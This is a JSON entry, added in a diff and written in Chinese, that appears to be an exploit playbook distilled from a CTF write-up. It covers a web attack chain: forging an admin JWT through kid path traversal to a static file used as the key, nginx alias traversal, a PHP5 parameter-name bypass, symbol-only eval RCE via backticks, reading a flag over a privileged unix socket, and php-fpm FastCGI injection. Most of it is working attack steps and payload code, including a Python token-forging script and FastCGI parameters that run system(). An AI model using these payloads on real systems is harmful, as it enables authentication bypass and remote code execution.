@@ -1,0 +1,79 @@
+{
+  "id": "auto-jwt-kid-keyfile-forge-chain",
+  "title": "认证网关迁移接缝：JWT kid 文件穿越伪造 admin + PHP5 点号参数保点绕过 + 纯符号 eval RCE + 特权 unix socket 取旗",
+  "vuln_pattern": "以 header.kid 选取本地文件作 HMAC 密钥的 JWT 网关，可用路径穿越把任意可读静态文件当密钥自签 admin 令牌，再链式利用 PHP5 点号参数解析怪癖、纯符号 eval 与 777 权限元数据 socket 完成越权到 RCE 到读旗。",
+  "fingerprint": [
+    "认证网关",
+    "运行时迁移",
+    "云函数",
+    "Serverless",
+    "静态资源穿越",
+    "管理员规则引擎",
+    "单行规则引擎",
+    "点号参数名",
+    "伪造令牌",
+    "签名密钥",
+    "JWT kid",
+    "HS256 key confusion",
+    "nginx alias traversal",
+    "php-fpm FastCGI",
+    "symbol-only eval",
+    "backtick RCE",
+    "unix socket metadata",
+    "kid path traversal"
+  ],
+  "exploit_steps": [
+    "叙事识别：题面出现\"刚完成认证网关/运行时迁移\"即优先在新旧组件接缝找洞——迁移备忘、备份密钥、并存的旧认证路径；先解码现有登录 JWT 看 header 是否含 kid、alg=HS256 及低权 role。",
+    "静态资源侧读线索：对静态目录测 nginx alias 穿越（形如 /public/static../ 无尾斜杠的粘合段可越出目录列出上级），读迁移说明文件确认\"kid 指向本地密钥文件，工程师可能复用其它可读文件作临时密钥\"这类暗示。",
+    "JWT kid 路径穿越伪造 admin：把 header.kid 改为 ../<已知可读静态文件>（如 ../css/reset.css、../js/login.js），服务端 file_get_contents(keys_dir.'/'.kid) 会读到该文件作 HMAC 密钥；攻击者用 HTTP GET 取同一文件原文作密钥，本地 HS256 自签 {role:admin} 载荷即绕过认证。注意穿越深度与扩展名白名单（常见只放行 .js/.css/.json）。",
+    "进入管理端规则引擎：admin 面板常有\"单行表达式/规则\"输入，字段名可能带点（php_code.execute）。PHP 默认把参数名中的点转下划线导致后端收不到，需保点绕过。",
+    "PHP5 点号保点绕过（版本相关，必须远端实证）：把 POST 参数名发成 base[key.suffix 形态（未闭合中括号、点在中括号之后），旧版 php_register_variable_ex 遇 [ 转 _ 后即停止后续点号替换，最终生成含点顶层键；用\"响应与 GET 基线逐字节 diff\"作 oracle 盲测各参数名变体撞出命中键。",
+    "纯符号 PHP 表达式 eval RCE：当过滤禁用字母数字分号时，用 [].[] 得 \"ArrayArray\" 取字 + 字符串自增(++)拼任意字母 + 布尔比较构造整数 + chr 变量函数产任意字符，最后用反引号执行运算符跑 shell 命令回显。",
+    "落地后找平台侧秘密：flag 常不在 world-readable 文件而由 root 运行的元数据/控制 agent 通过 unix socket 暴露；枚举 777 权限的 socket 并 curl --unix-socket 直接读取。",
+    "旁路等效出口：若应用层绕过走不通，探测同机未鉴权 php-fpm(9000)端口，FastCGI 直连注入 PHP_VALUE=auto_prepend_file=php://input 拿同权限 RCE，完全绕开应用层。"
+  ],
+  "key_payloads": [
+    "# JWT kid 文件穿越伪造 admin（值占位）\nimport requests, jwt, time\nURL=\"http://<TARGET>\"\nkey=requests.get(URL+\"/<KNOWN_STATIC_FILE>\").content   # 如 /css/reset.css\ntok=jwt.encode({\"email\":\"<ADMIN_EMAIL>\",\"role\":\"admin\",\"exp\":int(time.time())+600}, key, algorithm=\"HS256\", headers={\"kid\":\"../<KNOWN_STATIC_FILE>\",\"typ\":\"JWT\"})\nrequests.get(URL+\"/<ADMIN_PAGE>\", cookies={\"token\":tok})",
+    "# nginx alias 穿越读迁移备忘（无尾斜杠粘合段）\nGET /public/static../secret/<MIGRATION_NOTE_FILE> HTTP/1.1",
+    "# PHP5 点号保点参数名盲测（基线 diff 作 oracle）\n# 目标后端读 $_POST['<base>.<key>']；候选名含未闭合中括号形态：\ncandidates = [\"<base>[<key>.<suffix>\", \"<base>[<key>.<suffix>]\", \"<base>_<key>[.<suffix>\"]\nfor nm in candidates:\n    r = s.post(URL+\"/<ADMIN_PAGE>\", data={nm:\"$_==[]\", \"run_code\":\"1\"})\n    if r.text != baseline: print(\"[DIFF]\", nm)",
+    "# 纯符号 eval 载荷骨架（eval 载体为 return <expr>;，禁字母数字分号）\n# ArrayArray 取字: ($_=[].[])?$_[<int_expr>]:_   基础字母 A(0) r(1) a(3) y(4)\n# 整数: ($_==$_)=1, 相加/相乘嵌套构造任意 n\n# 任意字母: 从 a/A 用 ++$_ 自增 steps 次\n# 任意字符: (($_=<拼出的字符串'chr'>)?$_(<int_expr n>):_) = chr(n)\n# 命令执行: ($_=<拼出的命令字符串>)?`$_`:_   # 反引号执行\nPOST /<ADMIN_PAGE>  (Cookie: token=<伪造admin JWT>)\n<base>[<key>.<suffix>=<纯符号表达式>&run_code=1",
+    "# 特权 unix socket 取旗\ncurl --unix-socket /run/<PLATFORM>/metadata.sock http://localhost/latest/flag",
+    "# 旁路：未鉴权 php-fpm FastCGI 直连注入（关键 params）\nparams = {\"SCRIPT_FILENAME\":\"/var/www/html/index.php\", \"REQUEST_METHOD\":\"POST\",\n          \"PHP_VALUE\":\"auto_prepend_file = php://input\",\n          \"PHP_ADMIN_VALUE\":\"allow_url_include = On\", ...}\n# STDIN 放 <?php system(base64_decode('<B64>')); ?> 交由 9000 端口执行"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "jwt-kid",
+    "hmac-key-confusion",
+    "path-traversal",
+    "nginx-alias",
+    "php-parser-quirk",
+    "dot-to-underscore-bypass",
+    "eval-symbol-only",
+    "backtick-rce",
+    "php-fpm-fastcgi",
+    "unix-socket-metadata",
+    "privilege-boundary",
+    "attack-chain"
+  ],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "JWT header 含 kid 且服务端用 kid 作路径拼接读本地文件作 HMAC 密钥，alg 为 HS256 且密钥可被攻击者通过 HTTP 直接读取",
+    "存在可读的已知静态文件（.js/.css/.json 常在白名单内）用作签名密钥",
+    "目标为旧版 PHP(5.x)，点号参数名解析存在未闭合中括号保点怪癖（需远端实证，勿以本地新版行为判死路）",
+    "规则引擎/表达式入口以 eval(\"return \".$code.\";\") 执行且仅黑名单过滤字母数字与部分符号",
+    "flag 由特权进程经 777 权限 unix socket 暴露，或同机存在未鉴权 php-fpm(9000)"
+  ],
+  "verify_oracle": "伪造 admin 令牌后请求管理页返回 200 且出现管理员/规则引擎特征文案（响应体积明显大于低权页）；纯符号表达式回显 uid=xx(www-data) 即证 eval RCE 成立；curl unix socket 返回 flag{...} 且大小与 world-readable 的 flag 文件一致即命中。",
+  "pitfalls": [
+    "别用本地新版 PHP 的解析行为给远端判死路：点号→下划线在 PHP5 与 PHP8 行为不同，参数名保点必须对远端盲测实证。",
+    "参数名爆破要覆盖非常规形态：基名在中括号前、点在中括号之后且未闭合（base[key.suffix），只测 base[key.suffix]/base_key 等近亲会恰好错过真正命中项。",
+    "kid 密钥文件有扩展名白名单：内容逐字节正确的非白名单文件（如 README/txt）仍被拒；绝对路径无效因前缀固定拼接 keys 目录。",
+    "keys 目录 403 往往只是 nginx 前缀 deny，不代表磁盘无备份或无法经 RCE 读到密钥明文。",
+    "eval 禁字符集要精确探明（常禁字母数字分号及 ~ ^ & | 引号 / !），反引号常被漏禁——它就是\"运行时仍可用的能力\"。",
+    "flag 常不在 flag.txt（root-only 400），而在特权 agent 的 socket；被 world-readable 文件误导会卡住。",
+    "遇到迁移叙事优先找并存的旧认证路径、备份密钥、迁移备忘，接缝处才是洞。"
+  ],
+  "anti_fingerprint": []
+}
